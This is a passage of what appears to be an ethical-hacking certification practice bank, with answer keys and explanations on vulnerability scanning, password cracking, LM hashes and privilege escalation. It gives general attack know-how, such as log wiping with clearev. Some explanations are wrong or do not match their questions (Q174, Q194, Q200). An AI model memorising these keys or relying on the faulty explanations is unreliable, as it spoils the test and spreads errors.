> Vulnerability scanners generally scan for different network nodes and discover hostnames, but they cannot determine if all systems are following a standard naming convention. They can also not ascertain if the systems are already compromised. Vulnerability scanners cannot be used to remove administrator access from multiple machines.

174. Which of the following settings enables Nessus to detect when it is sending too many packets and the network pipe is approaching capacity?
+ [ ] Netstat WMI Scan
+ [x] Reduce parallel connections on congestion
+ [ ] Silent Dependencies
+ [ ] Consider unscanned ports as closed
> **Explanation:**
> The Netstat WMI scan finds open ports in the Windows system. Silent dependencies limit the amount of plugin data. According to Nessus Network Auditing, edited by Russ Rogers, ‘Consider unscanned ports as closed’ will tell Nessus that all other ports not included in the port range scan to be considered as closed. This prevents ports that are targeted against ports outside that range from running.”

175. What is the correct order for vulnerability management life cycle?
+ [ ] Monitor → risk assessment → remediation → verification → creating baseline → vulnerability assessment
+ [x] a. Creating baseline → vulnerability assessment → risk assessment → remediation → verification → monitor
+ [ ] c. Verification → risk assessment → monitor → remediation → creating baseline → vulnerability assessment
+ [ ] b. Verification → vulnerability assessment → monitor → remediation → creating baseline → risk assessment
> **Explanation:**
> Vulnerability management life cycle is an important process that helps in finding and remediating security weaknesses before they are exploited. The correct order of vulnerability management life cycle is **Creating baseline → vulnerability assessment →risk assessment → remediation →verification →monitor**

176. Which term refers to common software vulnerabilities that happen due to coding errors allowing attackers to get access to the target system?
+ [ ] Active Footprinting
+ [ ] Port Scanning
+ [ ] Banner Grabbing
+ [x] Buffer Overflows
> **Explanation:**
> **Buffer overflows** are common software vulnerabilities that happen due to coding errors allowing attackers to get access to the target system. In a buffer overflow attack, attackers undermine the functioning of programs and try to take the control of the system by writing content beyond the allocated size of the buffer. Insufficient bounds checking in the program is the root cause because of which the buffer is not able to handle data beyond its limit, causing the flow of data to adjacent memory locations and overwriting their data values. Systems often crash or become unstable or show erratic program behavior when buffer overflow occurs.
> 
> **Active footprinting** involves gathering information about the target with direct interaction. In active footprinting, information is gathered by querying published name servers, extracting metadata, web spidering, Whois lookup, etc.
> 
> **Port scanning** is the process of checking the services running on the target computer by sending a sequence of messages in an attempt to break in. Port scanning involves connecting to or probing TCP and UDP ports on the target system to determine if the services are running or are in a listening state.
> 
> **Banner grabbing** or “OS fingerprinting,” is a method used to determine the operating system that is running on a remote target system.

177. Tesla is running an application with debug enabled in one of its system. Under which category of vulnerabilities can this flaw be classified?
+ [ ] Operating System Flaws
+ [x] Misconfiguration
+ [ ] Design Flaws
+ [ ] Unpatched servers
> **Explanation:**
> Misconfiguration is the most common vulnerability that is mainly caused by human error, which allows attackers to gain unauthorized access to the system. This may happen intentionally or unintentionally affecting web servers, application platform, database and network.
> 
> A system can be misconfigured in so many ways:
> + An application running with debug enabled
> + Outdated software running on the system
> + Running unnecessary services on a machine
> + Using misconfigured SSL certificates and default certificates
> + Improperly authenticated external systems
> + Disabling security settings and features

178. Sohum is carrying out a security check on a system. This security check involves carrying out a configuration-level check through the command line in order to identify vulnerabilities such as incorrect registry and file permissions, as well as software configuration errors. Which type of assessment is performed by Sohum?
+ [x] Host based Assessment
+ [ ] Network based Assessment
+ [ ] Internal Assessment
+ [ ] External Assessment
> **Explanation:**
> **Host-based assessments** are a type of security check that involves carrying out a configuration-level check through the command line. These assessments check the security of a particular network or server. Host-based scanners assess systems to identify vulnerabilities such as incorrect registry and file permissions, as well as software configuration errors. Host-based assessment can use many commercial and open-source scanning tools.
> 
> **External assessment** assesses the network from a hacker's point of view to find out what exploits and vulnerabilities are accessible to the outside world. These types of assessments use external devices such as firewalls, routers, and servers.
> 
> **Network assessments** determine the possible network security attacks that may occur on an organization’s system. These assessments evaluate the organization’s system for vulnerabilities such as missing patches, unnecessary services, weak authentication, and weak encryption.
> 
> **Internal assessment** involves scrutinizing the internal network to find exploits and vulnerabilities.

179. Which assessment focuses on transactional Web applications, traditional client-server applications, and hybrid systems?
+ [ ] Wireless network Assessment
+ [ ] Passive Assessment
+ [x] Application Assessment
+ [ ] Active Assessment
> **Explanation:**
> **Application assessment** focuses on transactional Web applications, traditional client server applications, and hybrid systems. It analyzes all elements of an application infrastructure, including deployment and communication within the client and server. This type of assessment tests the web server infrastructure for any misconfiguration, outdated content, and known vulnerabilities. Security professionals use both commercial and open-source tools to perform such assessments.
> 
> **Passive assessments** sniff the traffic present on the network to identify the active systems, network services, applications, and vulnerabilities. Passive assessments also provide a list of the users who are currently using the network.
> 
> **Active assessments** are a type of vulnerability assessment that uses network scanners to scan the network to identify the hosts, services, and vulnerabilities present in that network. Active network scanners have the capability to reduce the intrusiveness of the checks they perform.
> 
> **Wireless network assessment** determines the vulnerabilities in an organization’s wireless networks. Wireless network assessments try to attack wireless authentication mechanisms and get unauthorized access. This type of assessment tests wireless networks and identifies rogue wireless networks that may exist within an organization’s perimeter. These assessments audit client-specified sites with a wireless network.

180. Which of the following term refers to the process of reducing the severity of vulnerabilities in vulnerability management life cycle?
+ [ ] Verification
+ [x] Remediation
+ [ ] Vulnerability Assessment
+ [ ] Risk Assessment
> **Explanation:**
> Vulnerability management life cycle is an important process that helps in finding and remediating security weaknesses before they are exploited. This includes defining the risk posture and policies for an organization, creating a complete asset list of systems, scanning and assessing the environment for vulnerabilities and exposures, and taking action to mitigate the vulnerabilities that are found.
> 
> The phases involved in vulnerability management are:
> + **Creating Baseline**
> In this phase, critical assets are identified and prioritized to create a good baseline for the vulnerability management.
> 
> + **Vulnerability Assessment**
> This is a very crucial phase in vulnerability management. In this step, the security analyst identifies the known vulnerabilities in the organization infrastructure.
> 
> + **Risk Assessment**
> In this phase, all the serious uncertainties that are associated with the system are assessed, fixed, and permanently eliminated for ensuring a flaw free system.
> + **Remediation**
> Remediation is the process of reducing the severity of vulnerabilities. This phase is initiated after the successful implementation of the baseline and assessment steps.
> +  **Verification**
> This phase provides a clear visibility into the firm and allows the security team to check whether all the previous phases are perfectly employed or not.
> + **Monitor**
> Regular monitoring needs to be performed for maintaining the system security using tools such as IDS/IPS, firewalls, etc.


## Vulnerability Assessment Solutions
181. On a Linux device, which of the following commands will start the Nessus client in the background so that the Nessus server can be configured?
+ [ ] nessus +
+ [ ] nessus *s
+ [x] nessus &
+ [ ] nessus -d
> **Explanation:**
> In Linux to start a process in the background you use &.  
> nessus & runs nessus client in background.

182. Which of the following tools will scan a network to perform vulnerability checks and compliance auditing?
+ [ ] Metasploit
+ [x] Nessus
+ [ ] BeEF
+ [ ] NMAP
> **Explanation:**
> Nessus is a vulnerability scanner developed by Tenable Network Security. It is free of charge for personal use in a nonenterprise environment.

183. Which of the following tools would be the best choice for achieving compliance with PCI Requirement 11?
+ [x] Nessus
+ [ ] Sub7
+ [ ] Truecrypt
+ [ ] Clamwin
> **Explanation:**
> PCI DSS requirement 11: Regular testing of security systems and processes involves running internal and external vulnerability scans for all organizations involved in payment card processing.
> 
> PCI requires the below types of network scanning:
> + Run internal and external network vulnerability scans at least quarterly and after any significant change in the network
> + The external scan must be done via an approved scanning vendor (ASV)
> 
> Nessus can be used to regularly test systems for security issues and correct configurations. If the log correlation engine is also deployed, it can be used to log the vulnerability scanning activity to prove that systems are being audited?

184. Which type of assessment tools are used to find and identify previously unknown vulnerabilities in a system?
+ [ ] Application-layer vulnerability assessment tools
+ [ ] Scope assessment tools
+ [ ] Active Scanning Tools
+ [x] Depth assessment tools
> **Explanation:**
> **Depth Assessment Tools**
> Depth assessment tools are used to find and identify previously unknown vulnerabilities in a system. Generally, these tools are used to identify vulnerabilities to an unstable degree of depth. Such types of tools include fuzzers that give arbitrary input to a system’s interface. Many of these tools use a set of vulnerability signatures for testing that the product is resistant to a known vulnerability or not.
> 
> **Scope Assessment Tools**
> Scope assessment tools provides assessment of the security by testing vulnerabilities in the applications and operating system. These tools provide a standard control and a reporting interface that allows the user to select a suitable scan.
> 
> **Application-Layer Vulnerability Assessment Tools**
> Application-layer vulnerability assessment tools are designed to serve the needs of all kinds of operating system types and applications.
> 
> **Active Scanning Tools**
> Active scanners perform vulnerability checks on the network that consume resources on the network.

185. Which among the following is not a metric for measuring vulnerabilities in common vulnerability scoring system (CVSS)?
+ [x] Active Metrics
+ [ ] Base Metrics
+ [ ] Environmental Metrics
+ [ ] Temporal Metrics
> **Explanation:**
> CVSS assessment consists of three metrics for measuring vulnerabilities:  
> +  Base metrics: It represents the inherent qualities of a vulnerability.  
> +  Temporal metrics: It represents the features that keep on changing during the lifetime of a vulnerability.  
> +  Environmental metrics: It represents the vulnerabilities that are based on a particular environment or implementation.

186. Sanya is a security analyst in a multinational company who wants to schedule scans across multiple scanners, use wizards to easily and quickly create policies and wants to send results via email to her boss. Which vulnerability assessment tool should she use to get the best results?
+ [x] Nessus Professional
+ [ ] Wireshark
+ [ ] Recon-ng
+ [ ] FOCA
> **Explanation:**
> **Nessus Professional** is an assessment solution for identifying vulnerabilities, configuration issues, and malware that attackers use to penetrate networks. It performs vulnerability, configuration, and compliance assessment. It supports various technologies such as operating systems, network devices, hypervisors, databases, tablets/phones, web servers, and critical infrastructure. Nessus is the vulnerability scanning platform for auditors and security analysts. Users can schedule scans across multiple scanners, use wizards to easily and quickly create policies, schedule scans, and send results via email.
> 
> **Recon-ng and FOCA** are footprinting tools used to collect basic information about the target systems in order to exploit them.
> 
> **Wireshark** is a traffic capturing tool that lets you capture and interactively browse the traffic running on a computer network. It captures live network traffic from Ethernet, IEEE 802.11, PPP/HDLC, ATM, Bluetooth, USB, Token Ring, Frame Relay, FDDI networks.

187. Which tool includes a graphical and command line interface that can perform local or remote scans of Microsoft Windows systems?
+ [x] Microsoft Baseline Security Analyzer (MBSA)
+ [ ] Netcraft
+ [ ] FOCA
+ [ ] Wireshark
> **Explanation:**
> Netcraft is a domain footprinting tool, FOCA is a metadata extraction tool, Wireshark is a network sniffer, whereas Microsoft Baseline Security Analyzer (MBSA) is a tool designed for IT professionals to determine the state of their security in accordance with Microsoft security recommendations.

188. Which of the following tools provides comprehensive vulnerability management for mobile devices, smartphones, and tablets?
+ [ ] zANTI
+ [ ] FaceNiff
+ [x] Retina CS for Mobile
+ [ ] Pamn IP Scanner
> **Explanation:**
> Retina CS for Mobile is the industry’s innovative approach to security, policy, and health management for mobile devices. It provides comprehensive vulnerability management for mobile devices, smartphones, and tablets. It integrates mobile device assessment and vulnerability management for proactively discovering, prioritizing, and fixing smartphone security weaknesses.
> 
> zANTI, FaceNiff, and Pamn IP Scanner are the scanning tools for mobile devices used to identify all active machines and Internet devices on the network.

189. Which element in a vulnerability scanning report allows the system administrator to obtain additional information about the scanning such as the origin of the scan?
+ [ ] Target information
+ [x] Classification
+ [ ] Scan information
+ [ ] Services
> **Explanation:**
> A vulnerability assessment report will provide detailed information on the vulnerabilities that are found in the computing environment. The report will help organizations to identify the security posture found in the computing systems (such as web servers, firewalls, routers, email, and file services) and provide solutions to reduce failures in the computing system.
> 
> Vulnerability reports cover the following elements:
> + Scan information: This part of the report provides information such as the name of the scanning tool, its version, and the network ports that have to be scanned.
> + Target information: This part of the report contains information about the target system’s name and address.
> + Results: This section provides a complete scanning report. It contains subtopics such as target, services, vulnerability, classification, and assessment.
> + Target: This subtopic includes each host’s detailed information.
> + Services: The subtopic defines the network services by their names and ports.
> + Classification: This subtopic allows the system administrator to obtain additional information about the scanning such as origin of the scan.
> + Assessment: This class provides information regarding the scanner’s assessment of the vulnerability.

190. SecTech Inc. is worried about the latest security incidents and data theft reports. The management wants a comprehensive vulnerability assessment of the complete information system at the company. However, SecTech does not have the required resources or capabilities to perform a vulnerability assessment. They decide to purchase a vulnerability assessment tool to test a host or application for vulnerabilities. Which of the following factors should the organization NOT consider while purchasing a vulnerability assessment tool?
+ [ ] Test run scheduling
+ [ ] Functionality for writing own tests
+ [x] Links to patches
+ [ ] Types of vulnerabilities being assessed
> **Explanation:**
> In the above scenario, the organization is planning to purchase a vulnerability assessment tool to test a host or application for vulnerabilities. There are several vulnerability assessment tools available that include port scanners, vulnerability scanners, and OS vulnerability assessment scanners. Organizations have to choose the right tools based on their test requirements.
> 
> The criteria to be followed at the time of choosing or purchasing any vulnerability assessment tool are as follows:
> + Types of vulnerabilities being assessed
> + Testing capability of scanning
> + Ability to provide accurate reports
> + Efficient and accurate scanning
> + Capability to perform smart search
> + Functionality for writing own tests
> + Test run scheduling

# 06. System Scanning
## Techniques to Gain Access to the System
191. Which of the following is an example of two-factor authentication?
+ [ ] Digital Certificate and Hardware Token
+ [ ] PIN Number and Birth Date
+ [x] Password and fingerprint
+ [ ] Username and Password
> **Explanation:**
> **Two-Factor Authentication**
> Instead of fixed passwords, use two-factor authentication for high-risk network services such as VPNs and modem pools. In the two factor authentication (TFA) approach, the user must present two different forms of proof of identity. If an attacker is trying to break into a user account, then he or she needs to break the two forms of user identity, which is more difficult to do. Hence, TFA is a defense-in-depth security mechanism and part of the multifactor authentication family. The TFA uses two pieces of evidence that a user should provide could include a password as well as security code or biometric factor such as fingerprint or facial scan or smart card.

192. Which of the following is the advantage of adopting a single sign on (SSO) system?
+ [ ] Decreased security as the logout process is different across applications
+ [x] A reduction in password fatigue for users because they do not need to know multiple passwords when accessing multiple applications
+ [ ] A reduction in overall risk to the system since network and application attacks can only happen at the SSO point
+ [ ] Impacts user experience when an application times out the user needs to login again reducing productivity
> **Explanation:**
> **Advantages of Single Sign On (SSO) system:**
> + A reduction in password fatigue for users because they do not need to know multiple passwords when accessing multiple applications.
> + A reduction in system administration overhead since any user login problems can be resolved at the SSO system.
> + Improves usability and user satisfaction through automatic login functionality.
> + Users need not maintain multiple passwords and since authentication is performed at a centralized server it improves security.
> + Improves productivity through single sign in functionality as it reduces the login time.
> + Improves auditing as the SSO system provides easy way of tracking application usage, shared resources usage, etc.
> + Improves account management such as account disabling (Disabling hardware and network accounts).

193. What statement is true regarding LAN Manager (LM) hashes?
+ [ ] LM hashes are based on AES128 cryptographic standard.
+ [ ] LM hashes consist in 48 hexadecimal characters.
+ [ ] Uppercase characters in the password are converted to lowercase.
+ [x] LM hashes limit the password length to a maximum of 14 characters.
> **Explanation:**
> LAN Manager uses a 14-byte password. If the password is less than 14 bytes, it is concatenated with zeros. After conversion to uppercase, it is split into two 7-byte halves. From each 7-byte half an 8-byte odd parity DES key is constructed. Each 8-byte DES key is used to encrypt a fixed value. The results of these encryptions are concatenated into a 16-byte value. The value obtained is the LAN Manager one-way hash for the password.
> 
> LM hashes limit the length of the password to a maximum of 14 characters. What makes the LM hash vulnerable is that an attacker has to go through just 7 characters twice to retrieve passwords up to 14 characters in length. There is no salting (randomness) done. For instance, if the password is 7 characters or less, the second half will always be a constant (0xAAD3B435B51404EE). If it has over 7 characters such as 10, then it is split up into a password hash of seven variable characters and another password hash of three characters. The password hash of three variable characters can be easily cracked with password crackers such as LOphtCrack. It is easy for password crackers to detect if there is an 8-character when the LM password is used. The challenge response can then be brute-forced for the LM-hash. The number of possible combinations in the LM password is low compared to the Windows NT password.

194. A pen tester is using Metasploit to exploit an FTP server and pivot to a LAN. How will the pen tester pivot using Metasploit?
+ [x] Create a route statement in the meterpreter.
+ [ ] Reconfigure the network settings in the meterpreter.
+ [ ] Issue the pivot exploit and set the meterpreter.
+ [ ] Set the payload to propagate through the meterpreter.
> **Explanation:**
> When malicious activities are performed on the system with Metasploit Framework, the Logs of the target system can be wiped out by launching meterpreter shell prompt of the Metasploit Framework and typing clearev command in meterpreter shell prompt followed by typing Enter.

195. John the Ripper is a technical assessment tool used to test the weakness of which of the following?
+ [x] Passwords
+ [ ] File permissions
+ [ ] Firewall rulesets
+ [ ] Usernames
> **Explanation:**
> John the Ripper is a password cracker, which is currently available for many flavors of UNIX, Windows, DOS, BeOS, and OpenVMS. Its primary purpose is to detect weak UNIX passwords.

196. Identify the technique used by the attackers to execute malicious code remotely?
+ [ ] Rootkits and steganography
+ [ ] Sniffing network traffic
+ [x] Install malicious programs
+ [ ] Modify or delete logs
> **Explanation:**
> **Executing Applications:** Once attackers have administrator privileges, they attempt to install malicious programs such as Trojans, Backdoors, Rootkits, and Keyloggers, which grant them remote system access, thereby enabling them to execute malicious codes remotely. Installing Rootkits allows them to gain access at the operating system level to perform malicious activities. To maintain access for use at a later date, they may install Backdoors.
> 
> **Hiding Files:** Attackers use Rootkits and steganography techniques to attempt to hide the malicious files they install on the system, and thus their activities.
> 
> **Covering Tracks:** To remain undetected, it is important for attackers to erase all evidence of security compromise from the system. To achieve this, they might modify or delete logs in the system using certain log-wiping utilities, thus removing all evidence of their presence.
> 
> **Gaining Access:** In system hacking, the attacker first tries to gain access to a target system using information obtained and loopholes found in the system’s access control mechanism. Once attackers succeed in gaining access to the system, they are free to perform malicious activities such as stealing sensitive data, implementing a sniffer to capture network traffic, and infecting the system with malware. At this stage, attackers use techniques such as password cracking and social engineering tactics to gain access to the target system.

197. Which of the following type of access control determines the usage and access policies of the users and provides that a user can access a resource only if he or she has the access rights to that resource?
+ [ ] Rule-based access control
+ [ ] Role-based access control
+ [x] Mandatory access control
+ [ ] Discretionary access control
> **Explanation:**
> **Mandatory Access Control (MAC):** The mandatory access controls determine the usage and access policies of the users. Users can access a resource only if that particular user has the access rights to that resource. MAC finds its application in the data marked as highly confidential. The network administrators impose MAC, depending on the operating system and security kernel. It does not permit the end user to decide who can access the information, and does not permit the user to pass privileges to other users as the access could then be circumvented.
> 
> **Discretionary Access Control (DAC):** Discretionary access controls determine the access controls taken by any possessor of an object in order to decide the access controls of the subjects on those objects. The other name for DAC is a need-to-know access model. It permits the user, who is granted access to information, to decide how to protect the information and the level of sharing desired. Access to files is restricted to users and groups based upon their identity and the groups to which the users belong.
> 
> **Role Based Access Control (RBAC):** In role based access control, the access permissions are available based on the access policies determined by the system. The access permissions are out of user control, which means that users cannot amend the access policies created by the system. Users can be assigned access to systems, files, and fields on a one-to-one basis whereby access is granted to the user for a particular file or system. It can simplify the assignment of privileges and ensure that individuals have all the privileges necessary to perform their duties.
> 
> **Rule-Based Access Control (RuBAC):** In rule based access control, the end point devices such as firewalls verifies the request made to access the network resources against a set of rules. These rules generally include IP addresses, port numbers, etc.

198. A hacker is sniffing the network traffic and trying to crack the encrypted passwords using Dictionary, Brute-Force, and Cryptanalysis attacks. Which of the following tool helps the hacker to recover the passwords?
+ [ ] Metagoofil
+ [x] Cain and Abel
+ [ ] Nessus
+ [ ] Hoovers
> **Explanation:**
> **Hoovers** is a business research company that provides complete details about companies and industries all over the world. Hoovers provides patented business-related information through the Internet, data feeds, wireless devices, and co-branding agreements with other online services. It gives complete information about the organizations, industries, and people that drive the economy.
> 
> **Nessus** is an assessment solution for identifying vulnerabilities, configuration issues, and malware that attackers use to penetrate networks. It performs vulnerability, configuration, and compliance assessment. It supports various technologies such as operating systems, network devices, hypervisors, databases, tablets/phones, web servers and critical infrastructure.
> 
> **Cain & Abel** is a password recovery tool for Microsoft Operating Systems. It allows easy recovery of various kind of passwords by sniffing the network, cracking encrypted passwords using Dictionary, Brute-Force and Cryptanalysis attacks, recording VoIP conversations, decoding scrambled passwords, recovering wireless network keys, revealing password boxes, uncovering cached passwords and analyzing routing protocols. The program does not exploit any software vulnerabilities or bugs that could not be fixed with a little effort. It covers some security aspects/weaknesses present in protocol's standards, authentication methods and caching mechanisms. Its main purpose is the simplified recovery of passwords and credentials from various sources; however, it also ships some "non standard" utilities for Microsoft Windows users.
> 
> **Metagoofil** extracts metadata of public documents (pdf, doc, xls, ppt, docx, pptx, and xlsx) belonging to a target company. It performs a Google search to identify and download the documents to local disk and then extracts the metadata with different libraries like Hachoir, PdfMiner and others. With the results, it generates a report with usernames, software versions and servers or machine names that will help penetration testers in the information gathering phase.

199. You need to do an ethical hack for BAYARA Company, and the manager says that you need to obtain the password of the root account of the main server to hire you. You are in possession of a rainbow table, what else do you need to obtain the password of the root?
+ [ ] Do a vulnerability assessment
+ [ ] Inject an SQL script into the database
+ [ ] Perform a network recognition
+ [x] The hash of the root password
> **Explanation:**
> To do an offline hacking of the password with a rainbow table, you need the hashes of the passwords.

200. An engineer is learning to write exploits in C++ and is using Kali Linux. The engineer wants to compile the newest C++ exploit and name it calc.exe. Which command would the engineer use to accomplish this?
+ [ ] g++ hackersExploit.py -o calc.exe
+ [x] g++ hackersExploit.cpp -o calc.exe
+ [ ] g++ -i hackersExploit.pl -o calc.exe
+ [ ] g++ --compile –i hackersExploit.cpp -o calc.exe
> **Explanation:**
> Since the engineer is writing exploit in C++, the command should be g++ hackersExploit.cpp -o calc.exe
> 
> g++ hackersExploit.py -o calc.exe is for python exploit, and g++ -i hackersExploit.pl -o calc.exe is for perl exploit. In g++ --compile –i hackersExploit.cpp -o calc.exe, the command should be --c and not --compile. So the answer is “g++ hackersExploit.cpp -o calc.exe.”

201. Which tool can be used to silently copy files from USB devices?
+ [ ] USB Grabber
+ [ ] USB Sniffer
+ [ ] USB Snoopy
+ [x] USB Dumper
> **Explanation:**
> + USB Dumper copies the files and folders from the flash drive silently when it connected to the pc. It transfer the data from a removable USB drive to a directory named 'USB' by default, with an option to change it.
> + USB Grabber allows users to connect any analogue audio/video source to the system through a USB port.
> + USB Sniffer monitors the activity of USB ports on the system.
> + USB Snoopy is a sort of viewer of the USB traffic.

202. A company is using Windows Server 2003 for its Active Directory (AD). What is the most efficient way to crack the passwords for the AD users?
+ [ ] Perform a dictionary attack.
+ [x] Perform an attack with a rainbow table.
+ [ ] Perform a brute force attack.
+ [ ] Perform a hybrid attack.
> **Explanation:**
> A rainbow table attack uses the cryptanalytic time-memory trade-off technique, which requires less time than some other techniques. It uses already-calculated information stored in memory to crack the cryptography. In the rainbow table attack, the attacker creates a table of all the possible passwords and their respective hash values, known as a rainbow table, in advance.
> 
> Windows passwords are stored as a hash on disk using the NTLM algorithm. Older versions of Windows (prior to Windows Server 2008) also store passwords using the LM hashing algorithm. LM hashing was deprecated due its weak security design, which is vulnerable to rainbow table attacks within a greatly reduced period of time.
> 
> In the above scenario, the company is using Windows Server 2003 for its active directory, which is vulnerable to rainbow attack.

203. A computer science student needs to fill some information into a password protected Adobe PDF job application that was received from a prospective employer. Instead of requesting the password, the student decides to write a script that pulls passwords from a list of commonly used passwords to try against the secured PDF until the correct password is found or the list is exhausted. Identify the type of password attack.
+ [ ] Man-in-the-middle attack
+ [ ] Brute-force attack
+ [ ] Session hijacking
+ [x] Dictionary attack
> **Explanation:**
> **Man-in-the-Middle Attack:** When two parties are communicating, a man-in-middle attack can take place, in which a third party intercepts a communication between the two parties without their knowledge. Meanwhile, the third party eavesdrops on the traffic, and then passes it along. To do so, the “man in the middle” has to sniff from both sides of the connection simultaneously. In a MITM attack, the attacker acquires access to the communication channels between victim and server to extract the information.
> 
> **Brute Force Attack:** In the brute force method, all possible characters are tested, for example, uppercase from A to Z, numbers from 0 to 9, and lowercase from a to z. This method is useful to identify one-word or two-word passwords. If a password consists of uppercase and lowercase letters and special characters, it might take months or years to crack the password using a brute force attack.
> 
> **Dictionary Attack:** A dictionary attack has a predefined file that contains a list of words of various combinations, and an automated program tries entering these words one at a time to see if any of them are the password. This might not be effective if the password includes special characters and symbols. If the password is a simple word, then it can be found quickly.
> 
> **Session Hijacking:** Session hijacking refers to an attack where an attacker takes over a valid TCP communication session between two computers. Since most authentication only occurs at the start of a TCP session, it allows the attacker to gain access to a machine. Attackers can sniff all the traffic from the established TCP sessions and perform identity theft, information theft, fraud, etc.

204. How can rainbow tables be defeated?
+ [ ] Use of non-dictionary words
+ [ ] All uppercase character passwords
+ [ ] Lockout accounts under brute force password cracking attempts
+ [x] Password salting
> **Explanation:**
> Password salting is a technique where random strings of characters are added to the password before calculating their hashes. This makes it more difficult to reverse the hashes and defeats precomputed hash attacks.
> 
> Rainbow tables can be created for all non-dictionary words and uppercase characters. Locking out accounts is not a right answer as the rainbow attacks are passive attacks and not performed on live systems.

205. Which of the following tool is used for cracking passwords?
+ [ ] OpenVAS
+ [x] John the Ripper
+ [ ] Havij
+ [ ] Nikto
> **Explanation:**
> OpenVAS is a framework of several services and tools offering a comprehensive and powerful vulnerability scanning and vulnerability management solution.
> 
> John the Ripper is a password cracking tool, that can be used in multiple operating systems such as Unix, Windows, etc. It is helpful in detecting weak passwords in Unix environment. Besides several crypt(3) password hash types most commonly found on various Unix systems, supported out of the box are Windows LM hashes, plus lots of other hashes and ciphers in the community-enhanced version.
> 
> Nikto is an Open Source (GPL) web server scanner that performs comprehensive tests against web servers for multiple items, including over 6700 potentially dangerous files/programs, checks for outdated versions of over 1250 servers, and version specific problems on over 270 servers. It also checks for server configuration items such as the presence of multiple index files, HTTP server options, and will attempt to identify installed web servers and software.
> 
> Havij is an automated SQL Injection tool that helps penetration testers to find and exploit SQL Injection vulnerabilities on a web page.

206. How does the SAM database in Windows operating system store the user accounts and passwords?
+ [x] The operating system performs a one-way hash of the passwords.
+ [ ] The operating system uses key distribution center (KDC) for storing all user passwords.
+ [ ] The operating system stores the passwords in a secret file that users cannot find.
+ [ ] The operating system stores all passwords in a protected segment of volatile memory.
> **Explanation:**
> Windows uses the security accounts manager (SAM) database or active directory database to manage user accounts and passwords in the hashed format (one-way hash). The system does not store the passwords in plaintext format, but in hashed format, to protect them from attacks. The system implements SAM database as a registry file, and the Windows kernel obtains and keeps an exclusive file system lock on the SAM file. As this file consists of a file system lock, this provides some measure of security for the storage of passwords.

207. You have retrieved the raw hash values from a Windows 2000 Domain Controller. Using social engineering, you know that they are enforcing strong passwords. You understand that all users are required to use passwords that are at least eight characters in length. All passwords must also use three of the four following categories: lower-case letters, capital letters, numbers, and special characters. With your given knowledge of users, likely user account names, and the possibility that they will choose the easiest passwords possible, what would be the fastest type of password cracking attack you can run against these hash values to get results?
+ [ ] Brute Force Attack
+ [ ] Dictionary Attack
+ [ ] Replay attack
+ [x] Hybrid Attack
> **Explanation:**
> **Replay Attack:** In a replay attack, packets and authentication tokens are captured using a sniffer. After the relevant info is extracted, the tokens are placed back on the network to gain access. The attacker uses this type of attack to replay bank transactions or other similar types of data transfer, in the hope of replicating and/or altering activities, such as banking deposits or transfers.
> 
> **Dictionary Attack:** In a dictionary attack, a dictionary file is loaded into the cracking application that runs against user accounts. This dictionary is the text file that contains a number of dictionary words that are commonly used as passwords. The program uses every word present in the dictionary to find the password. Apart from a standard dictionary, attackers’ dictionaries have added entries with numbers and symbols added to words (e.g., “3December!962”). Simple keyboard finger rolls (“qwer0987”), which many believe to produce random and secure passwords, are thus included in an attacker's dictionary.
> 
> **Brute-Force Attack:** In a brute force attack, attackers try every combination of characters until the password is broken. Cryptographic algorithms must be sufficiently hardened to prevent a brute-force attack, which is defined by the RSA: “Exhaustive key-search, or brute-force search, is the basic technique for trying every possible key in turn until the correct key is identified.”
> 
> **Hybrid Attack:** A hybrid attack is more powerful as it uses both a dictionary attack and brute force attack. It also uses symbols and numbers. Password cracking becomes easier with this method. Often, people change their passwords merely by adding some numbers to their old passwords. In this case, the program would add some numbers and symbols to the words from the dictionary to try and crack the password. For example, if the old password is “system,” then there is a chance that the person will change it to “system1” or “system2.”


## Privilege Escalation Techniques
208. Least privilege is a security concept, which requires that a user is …
+ [x] Limited to those functions which are required to do the job.
+ [ ] Given privileges equal to everyone else in the department.
+ [ ] Given root or administrative privileges.
+ [ ] Trusted to keep all data and access to that data under their sole control.
> **Explanation:**
> Least privilege refers to the process of providing users with sufficient access privilege that allows them to perform only their assigned task and not more than that to ensure information security.

209. What is the best defense against a privilege escalation vulnerability?
+ [ ] Never perform debugging using bounds checkers and stress tests and increase the amount of code that runs with particular privilege.
+ [ ] Never place executables in write-protected directories.
+ [x] Run services with least privileged accounts and implement multifactor authentication and authorization.
+ [ ] Review user roles and administrator privileges for maximum utilization of automation services.
> **Explanation:**
> The following are the best countermeasures to defend against privilege escalation:
> + Restrict the interactive logon privileges
> + Use encryption technique to protect sensitive data
> + Run users and applications on the least privileges
> + Reduce the amount of code that runs with particular privilege
> + Implement multi-factor authentication and authorization
> + Perform debugging using bounds checkers and stress tests
> + Run services as unprivileged accounts
> + Test operating system and application coding errors and bugs thoroughly
> + Implement a privilege separation methodology to limit the scope of programming errors and bugs
> + Change UAC settings to “Always Notify”, so that it increases the visibility of the user when UAC elevation is requested
> + Restrict users from writing files to the search paths for applications
> + Continuously monitor file system permissions using auditing tools
> + Reduce the privileges of user accounts and groups so that only legitimate administrators can make service changes
> + Use whitelisting tools to identify and block malicious software that changes file, directory, and service permissions
> + Use fully qualified paths in all the Windows applications
> + Ensure that all executables are placed in write-protected directories
> + In MAC operating systems, prevent plist files from being altered by users making them read-only
> + Block unwanted system utilities or software that may be used to schedule tasks
> + Patch and update the web servers regularly

210. In which of the following techniques does an unauthorized user try to access the resources, functions, and other privileges that belong to the authorized user who has similar access permissions?
+ [x] Horizontal Privilege Escalation
+ [ ] Vertical Privilege Escalation
+ [ ] Rainbow Table Attack
+ [ ] Kerberos Authentication
> **Explanation:**
> Kerberos is a network authentication protocol that provides strong authentication for client/server applications by using secret-key cryptography. This provides mutual authentication, in that both the server and the user verify each other’s identity. Messages sent through Kerberos protocol are protected against replay attacks and eavesdropping.
> 
> Horizontal Privilege Escalation: In a horizontal privilege escalation, the unauthorize user tries to access the resources, functions, and other privileges that belong to the authorized user who has similar access permissions. For instance, online banking user A can easily access user B’s bank account.
> 
> A rainbow table attack is a type of cryptography attack where an attacker uses a rainbow table for reversing cryptographic hash functions. A rainbow table attack uses the cryptanalytic time memory trade-off technique, which requires less time than some other techniques. It uses already-calculated information stored in memory to crack the cryptography. In the rainbow table attack, the attacker creates a table of all the possible passwords and their respective hash values, known as a rainbow table, in advance.
> 
> Vertical Privilege Escalation: In a vertical privilege escalation, the unauthorized user tries to gain access to the resources and functions of the user with higher privileges, such as application or site administrators. For example, someone performing online banking can access the site using administrative functions.

211. Which of the following operating systems allows loading of weak dylibs dynamically that is exploited by attackers to place a malicious dylib in the specified location?
+ [x] OS X
+ [ ] Unix
+ [ ] Android
